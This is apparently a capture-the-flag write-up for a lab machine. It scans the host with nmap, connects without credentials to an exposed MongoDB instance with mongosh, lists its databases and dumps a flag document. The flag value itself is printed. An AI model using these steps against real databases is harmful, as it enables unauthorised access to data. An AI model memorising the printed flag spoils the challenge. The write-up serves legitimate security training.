```php
nmap -sV -A 10.129.148.247

22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
27017/tcp open  mongodb MongoDB 3.6.8 3.6.8
| mongodb-databases: 
```

We have to use `mongosh` to establish a shell with the MongoDB database

```php
drew@oracle:/usr/local/lib/node_modules/mongosh/bin$ ./mongosh.js "mongodb://10.129.148.247:27017"
Current Mongosh Log ID:	683960feb4167fb9a21efeb7
Connecting to:		mongodb://10.129.148.247:27017/?directConnection=true&appName=mongosh+1.3.1
Using MongoDB:		3.6.8
Using Mongosh:		1.3.1
```

See all collections in the database

```php
test> show dbs
admin                  32.8 kB
config                 73.7 kB
local                  73.7 kB
sensitive_information  32.8 kB
users                  32.8 kB
```

We query the documents for a collection called `flag` in a readable format

```json
db.flag.find().pretty()
[
  {
    _id: ObjectId("630e3dbcb82540ebbd1748c5"),
    flag: '1b6e6fb359e7c40241b6d431427ba6ea'
  }
]
```

We find the root flag `1b6e6fb359e7c40241b6d431427ba6ea`

We have rooted this machine 